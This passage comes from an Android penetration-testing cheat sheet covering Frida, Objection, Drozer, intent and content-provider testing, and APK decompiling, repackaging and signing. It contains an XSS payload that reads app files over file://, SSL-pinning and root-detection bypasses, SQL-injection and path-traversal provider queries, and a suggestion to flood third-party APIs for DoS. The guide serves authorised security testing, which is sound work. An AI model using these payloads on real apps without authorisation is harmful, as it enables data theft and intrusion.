```fundamental
file:///data/data/com.someapp.dev/shared_prefs/somefile.xml
```

Arbitrary file read using a cross-site scripting (XSS):

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file:///data/data/com.someapp.dev/shared_prefs/somefile.xml", true); // async
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            alert(xhr.responseText); // for demonstration purposes
        }
    }
    xhr.send();
</script>
```

After you finish testing \[and logout\], don't forget to [download](#downloadupload-files-and-directories) the app specific directories and inspect all the files inside. Inspect what is new and what still persists after the logout.

WebView specific directories to look for:

* `app_webview`
* `blob_storage`
* `Cookies`
* `pref_store`
* `Service Worker`
* `Session Storage`
* `Web Data`

## 8. Frida

Useful resources:

* [frida.re](https://frida.re/docs/home)
* [learnfrida.info](https://learnfrida.info)
* [codeshare.frida.re](https://codeshare.frida.re)
* [dweinstein/awesome-frida](https://github.com/dweinstein/awesome-frida)
* [interference-security/frida-scripts](https://github.com/interference-security/frida-scripts)
* [m0bilesecurity/Frida-Mobile-Scripts](https://github.com/m0bilesecurity/Frida-Mobile-Scripts)
* [WithSecureLabs/android-keystore-audit](https://github.com/WithSecureLabs/android-keystore-audit)

List processes:

```bash
frida-ps -Uai

frida-ps -Uai | grep -i 'keyword'
```

Get PID for a specified keyword:

```bash
frida-ps -Uai | grep -i 'keyword' | cut -d ' ' -f 1
```

Discover internal methods/calls:

```bash
frida-discover -U -f com.someapp.dev | tee frida_discover.txt
```

Trace internal methods/calls:

```bash
frida-trace -U -p 1337

frida-trace -U -p 1337 -i 'recv*' -i 'send*'
```

### Frida Scripts

Bypass SSL Pinning using [android-ssl-pinning-bypass-2](https://codeshare.frida.re/@ivan-sincek/android-ssl-pinning-bypass-2) script:

```fundamental
frida -U -no-pause -l android-ssl-pinning-bypass-2.js -f com.someapp.dev

frida -U -no-pause --codeshare ivan-sincek/android-ssl-pinning-bypass-2 -f com.someapp.dev
```

I prefer to use the built-in method in [Objection](#bypasses).

---

For this Frida script to work, you need to push your Burp Proxy or ZAP certificate to a specific location with the specific name `cacert.der`:

```fundamental
adb push cacert.der /data/local/tmp/cacert.der
```

Bypass SSL Pinning using [android-ssl-pinning-bypass](https://codeshare.frida.re/@ivan-sincek/android-ssl-pinning-bypass) script:

```fundamental
frida -U -no-pause -l android-ssl-pinning-bypass.js -f com.someapp.dev

frida -U -no-pause --codeshare ivan-sincek/android-ssl-pinning-bypass -f com.someapp.dev
```

I prefer to use the built-in method in [Objection](#bypasses).

---

Monitor all intent calls, including deep links, using [android-intent-monitor](https://codeshare.frida.re/@ivan-sincek/android-intent-monitor) script:

```fundamental
frida -U -no-pause -l android-intent-monitor.js -f com.someapp.dev

frida -U -no-pause --codeshare ivan-sincek/android-intent-monitor -f com.someapp.dev
```

## 9. Objection

Useful resources:

* [sensepost/objection](https://github.com/sensepost/objection)

Run:

```fundamental
objection -g com.someapp.dev explore
```

Run a [Frida](#8-frida) script in Objection:

```fundamental
import somescript.js

objection -g com.someapp.dev explore --startup-script somescript.js
```

Get environment variables:

```fundamental
env
```

List KeyStore:

```fundamental
android keystore list
```

Dump app's memory to a file:

```fundamental
memory dump all mem.dmp
```

Dump app's memory after, e.g., 10 minutes of inactivity, then, check if sensitive data is still in the memory. See section [4. Inspect Files](#4-inspect-files).

**In case Objection detaches from the app, use the process ID to attach it back without restarting the app.**

Search app's memory directly:

```bash
memory search 'somestring' --string
```

List classes and methods:

```bash
android hooking list classes

android hooking search classes com.someapp.dev
android hooking search classes 'keyword'

android hooking list class_methods 'someclass'
android hooking search methods com.someapp.dev 'someclass'
```

Hook on a class or method:

```bash
android hooking watch class 'someclass'

android hooking watch class_method 'somemethod' --dump-args --dump-backtrace --dump-return
```

Change the method's return value:

```bash
android hooking set return_value 'somemethod' 'somevalue'
```

Monitor the clipboard:

```fundamental
android clipboard monitor
```

### Bypasses

Bypass a root detection:

```bash
android root disable --quiet

objection -g com.someapp.dev explore --startup-command 'android root disable --quiet'
```

---

Bypass SSL pinning:

```bash
android sslpinning disable --quiet

objection -g com.someapp.dev explore --startup-command 'android sslpinning disable --quiet'
```

Also, you can import [Frida](#frida-scripts) script.

## 10. Drozer

Connect to a remote agent:

```fundamental
drozer console connect --server 192.168.1.10
```

List modules and show module details:

```fundamental
list

run somemodule --help
```

List / search packages:

```bash
run app.package.list

run app.package.list -f 'keyword'

run app.package.list -p android.permission.SOME_PERMISSION

run app.package.backup

run app.package.debuggable
```

Show a package information:

```fundamental
run app.package.info -a com.someapp.dev
```

Show app's AndroidManifest.xml:

```fundamental
run app.package.manifest com.someapp.dev
```

In case Drozer did not fetch the whole manifest file, decode an APK using [Apktool](#decode) and inspect the file manually.

Show app's attack surface:

```fundamental
run app.package.attacksurface com.someapp.dev
```

### Activities

Intents, together with other Android components, can easily lead to cross-site scripting (XSS), arbitrary file read/write, data leakage and exfiltration, remote code execute (RCE), etc.

Read more about intents and intent filters [here](developer.android.com/guide/components/intents-filters).

List exported and protected activities and their intent filters:

```fundamental
run app.activity.info -i -a com.someapp.dev

run app.activity.info -u -i -a com.someapp.dev
```

Examine the launch intent filter in main activity:

```fundamental
run app.package.launchintent com.someapp.dev
```

List browsable URIs (deep links):

```
run scanner.activity.browsable -a com.someapp.dev
```

You will need to [reverse engineer](#14-decompile-an-apk) the APK and look into the source code to find out what parameters need to be sent to the intent filter to exploit it.

Start an activity:

```fundamental
run app.activity.start --component com.someapp.dev com.someapp.dev.SomeActivity

run app.activity.start --component com.someapp.dev com.someapp.dev.SomeActivity --action android.intent.action.SOME_ACTION --data-uri somescheme://somehost --extra integer somekey somevalue --extra string somekey somevalue
```

Use `--help` to see more options.

__In Drozer, you cannot pass arrays, lists, objects, etc., in intet extras due to the console line interface (CLI) limitations, but the same can be done if you build your own "malicious" PoC app.__

### Content Providers

Read more about content providers [here](https://developer.android.com/guide/topics/providers/content-providers).

List exported and protected content providers:

```fundamental
run app.provider.info -a com.someapp.dev

run app.provider.info -u -a com.someapp.dev
```

List, query, and scan for vulnerabilities all content providers' URIs:

```fundamental
run app.provider.finduri com.someapp.dev

run scanner.provider.finduris -a com.someapp.dev

run scanner.provider.injection -a com.someapp.dev

run scanner.provider.sqltables -a com.someapp.dev

run scanner.provider.traversal -a com.someapp.dev
```

You will need to [reverse engineer](#14-decompile-an-apk) the APK and look into the source code to find out what parameters need to be sent to the intent filter to exploit it.

Content provider CRUD controls and more:

```fundamental
run app.provider.insert content://com.someapp.dev.ContentProvider --integer somekey somevalue --string somekey somevalue

run app.provider.query content://com.someapp.dev.ContentProvider --projection '*'

run app.provider.query content://com.someapp.dev.ContentProvider --projection '* FROM anothertable;--'

run app.provider.update content://com.someapp.dev.ContentProvider --selection 'somekey=?' --selection-args somevalue --integer somekey somevalue --string somekey somevalue

run app.provider.delete content://com.someapp.dev.ContentProvider --selection 'somekey=?' --selection-args somevalue

run app.provider.read content://com.someapp.dev.FileProvider/etc/hosts
```

Use `--help` to see more options.

### Broadcast Receivers

Read more about broadcast receivers [here](https://developer.android.com/develop/background-work/background-tasks/broadcasts).

List exported and protected broadcast receivers:

```fundamental
run app.broadcast.info -i -a com.someapp.dev

run app.broadcast.info -i -u -a com.someapp.dev
```

Monitor broadcast receivers:

```fundamental
run app.broadcast.sniff --action com.someapp.dev.SOME_ACTION
```

You will need to [reverse engineer](#14-decompile-an-apk) the APK and look into the source code to find out what parameters need to be sent to the intent filter to exploit it.

Send intent to a broadcast receiver:

```fundamental
run app.broadcast.send --action com.someapp.dev.SOME_ACTION --extra integer somekey somevalue --extra string somekey somevalue
```

__In Drozer, you cannot specify a broadcast receiver, but in [ADB](#android-debug-bridge-adb), you can.__

If a broadcast receiver does not have an intent filter, you can try triggering it with a non-existent action:

```fundamental
adb shell am broadcast -a android.intent.action.NON_EXISTING_ACTION -n come.someapp.dev/.SomeReceiver
```

Use `--help` to see more options.

### Services

Read more about services [here](https://developer.android.com/develop/background-work/services).

List exported and protected services:

```fundamental
run app.service.info -i -a com.someapp.dev

run app.service.info -i -u -a com.someapp.dev
```

You will need to [reverse engineer](#14-decompile-an-apk) the APK and look into the source code to find out what parameters need to be sent to the intent filter to exploit it.

Send intent to a service:

```fundamental
run app.service.send com.someapp.dev com.someapp.dev.SomeService --msg what arg1 arg2 --extra string somevalue --extra integer somevalue --bundle-as-obj
```

`--msg` is a special type of input. Read more about the Message class [here](https://developer.android.com/reference/android/os/Message).

`--bundle-as-obj` helps you to parse a special type of return data. Read more about the Bundle class [here](https://developer.android.com/reference/android/os/Bundle).

Use `--help` to see more options.

## 11. Intent Injections

Access a protected component, such as a private file or an SQLite content provider, using an exported (proxy) intent.

This can easily lead to arbitrary file read/write, data leakage and exfiltration, remote code execute (RCE), etc.

**This can only be done using a "malicious" PoC app, as it is too complex for tools such as Drozer.**

Find out how to perform intent injections using a "malicious" PoC app in my project at [ivan-sincek/malware-apk](https://github.com/ivan-sincek/malware-apk#implicit-intent-injection).

## 12. Taskjacking

Find out how to perform [taskjacking](https://developer.android.com/privacy-and-security/risks/strandhogg) using a "malicious" PoC app in my project at [ivan-sincek/malware-apk](https://github.com/ivan-sincek/malware-apk#taskjacking).

Sometimes, this is by design, to improve the user experience (UX) when "switching" between two apps.

## 13. Tapjacking

Find out how to perform [tapjacking](https://developer.android.com/privacy-and-security/risks/tapjacking) using a "malicious" PoC app in my project at [ivan-sincek/malware-apk](https://github.com/ivan-sincek/malware-apk#tapjacking).

App should prevent overlays on sensitive data inputs by specifying `android:filterTouchesWhenObscured="true"` in its layout files.

## 14. Decompile an APK

Decompile an APK:

```bash
jadx --threads-count $(grep -c 'processor' /proc/cpuinfo) -d /root/Desktop/source/ /root/Desktop/base.apk
```

**`d2j-dex2jar` \+ `jadx` actually gives the best results.**

Convert an APK to a JAR:

```fundamental
d2j-dex2jar base.apk -o base.jar
```

Decompile a JAR:

```bash
jadx --threads-count $(grep -c 'processor' /proc/cpuinfo) -d /root/Desktop/source_jar/ /root/Desktop/base.jar
```

Decompiling a JAR will give you a different directory structure, so you might want to decompile both, base.jar and base.apk.

Make sure to specify a full path to the output directory; otherwise, it will default to `/usr/share/jadx/bin/` directory (i.e., to the root directory).

Make sure to specify a full path to the base.jar or [base.apk](#pull-an-apk-baseapk); otherwise, JADX might not recognize it.

To inspect the source code using GUI, run the following command and open either base.jar or base.apk:

```fundamental
jadx-gui
```

---

Resolve `java.lang.OutOfMemoryError` issue by modifying `/usr/bin/d2j-dex2jar` and increasing the heap size specified in `-Xms` and `-Xmx` parameters, for example:

```fundamental
java -Xms1024m -Xmx4096m -classpath "${_classpath}" "com.googlecode.dex2jar.tools.Dex2jarCmd" "$@"
```

## 15. Repackage an APK

### Decode

Get the SMALI source code from an APK. Convenient for quickly fetching and inspecting app's AndroidManifest.xml.

```fundamental
apktool decode base.apk -o decoded
```

Decode an APK without decoding the sources and resources:

```fundamental
apktool decode -r -s base.apk -o decoded
```

### Repackage

Create a repackaged APK from the decoded directory:

```fundamental
apktool build -f decoded -o repackaged.apk
```

ZIP align all the files inside the repackaged APK and check the alignments:

```fundamental
zipalign -v 4 repackaged.apk

zipalign -c -v 4 repackaged.apk
```

### Code Sign

[keytool](https://docs.oracle.com/javase/10/tools/keytool.htm) and [jarsigner](https://docs.oracle.com/javase/10/tools/jarsigner.htm) come pre-installed with [Java](#java). However, use [apksigner](https://developer.android.com/tools/apksigner) for the best results because it can use `v1-4` signature schemes; while `jarsigner` can only use `v1` signature scheme.

Generate a code signing certificate:

```fundamental
keytool -genkey -keyalg RSA -validity 365 -keysize 2048 -storetype PKCS12 -alias apk_rsa_priv -keystore apk_rsa_priv.key -storepass 12345678
```

Code sign the repackaged APK:

```fundamental
apksigner sign --ks apk_rsa_priv.key --ks-pass "pass:12345678" repackaged.apk

jarsigner -sigalg SHA256withRSA -digestalg SHA-256 -tsa http://timestamp.digicert.com -keystore apk_rsa_priv.key -storepass 12345678 repackaged.apk apk_rsa_priv
```

Verify the repackaged APK's code signature:

```fundamental
apksigner verify repackaged.apk

jarsigner -verify -verbose -certs repackaged.apk
```

## 16. Miscellaneous

### Monitor the System Log

On your Kali Linux, run the following command:

```fundamental
adb logcat | grep 1337
```

Or, get the PID from a keyword:

```fundamental
keyword="keyword"; adb logcat | grep $(frida-ps -Uai | grep -i "${keyword}" | tr -s '[:blank:]' ' ' | cut -d ' ' -f 1)
```

### Monitor File Changes

On your Kali Linux, download the latest `fsmon` version from [GitHub](https://github.com/nowsecure/fsmon/releases), upload it to your Android device, give it necessary permissions, and run it:

```bash
adb push fsmon-and-arm /data/local/tmp/

adb shell su

chmod +x /data/local/tmp/fsmon-and-arm

/data/local/tmp/fsmon-and-arm /data/data/com.someapp.dev/
```

Always look for created or cached files, images/screenshots, etc.

Sensitive files such as know your customer (KYC) and similar, should not persists in the app specific directories on user's device after the file upload. Sensitive files should not be stored in `/tmp/` directory nor similar system-wide directories.

Images and screenshots path:

```fundamental
cd /mnt/sdcard/DCIM/
cd /storage/emulated/0/DCIM/

cd /mnt/media_rw/3664-6132/DCIM/
cd /storage/3664-6132/DCIM/

cd /data/system_ce/0/snapshots/
```

Don't confuse `/mnt/sdcard/` path with a real removable storage path because sometimes such path is device specific, so you will need to search it on the internet or extract it using some Java code. In my case it is `/mnt/media_rw/3664-6132/` path.

## 17. Tips and Security Best Practices

Bypass any keyboard restriction by copying and pasting data into an input field.

Access tokens should be short lived, and if possible, invalidated on logout.

Don't forget to test widgets, push notifications, and Firebase.

Sometimes, deep links and widgets can bypass authentication, including biometrics.

Only if explicitly allowed, try flooding 3rd party APIs to cause possible monetary damage to the company, or denial-of-service (DoS) by exhausting the allowed quotas/limits.

---

App should not disclose sensitive data in the predictive text (due to incorrectly defined input field type), app switcher, and push notifications.

App should warn a user when taking a screenshot of sensitive data.

App should warn a user that it is trivial to bypass biometrics authentication if his Android device is jailbroken.

Production app (i.e., build) should not be debuggable.

## 18. Useful Websites and Tools

| URL | Description |
| --- | --- |
| [developer.android.com](https://developer.android.com) | Official Android documentation. |
| [streaak/keyhacks](https://github.com/streaak/keyhacks) | Validate various API keys. |
| [zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx) | Decode QR codes. |
| [odinforum.com](https://odinforum.com/discussion/11/latest-versions-of-odin-flashing-tool) | Firmware flashing tool for Samsung devices. |
| [developer.samsung.com/android-usb-driver](https://developer.samsung.com/android-usb-driver) | USB driver for Samsung devices. |
| [jesec/SamFirm.NET](https://github.com/jesec/SamFirm.NET) | Download firmwares for Samsung devices. |
| [xdaforums.com](https://xdaforums.com/t/magisk-the-magic-mask-for-android.3473445) | Mobile software development forum. |
| [twrp.me/about](https://twrp.me/about) | Custom backup and recovery. |

## 19. Vulnerable Apps

Vulnerable apps for learning purposes:

* [payatu/diva-android](https://github.com/payatu/diva-android)
* [WithSecureLabs/sieve](https://github.com/WithSecureLabs/sieve)
* [satishpatnayak/AndroGoat](https://github.com/satishpatnayak/AndroGoat)
* [dineshshetty/Android-InsecureBankv2](https://github.com/dineshshetty/Android-InsecureBankv2)
* [ctf.hpandro.raviramesh.info](https://ctf.hpandro.raviramesh.info)
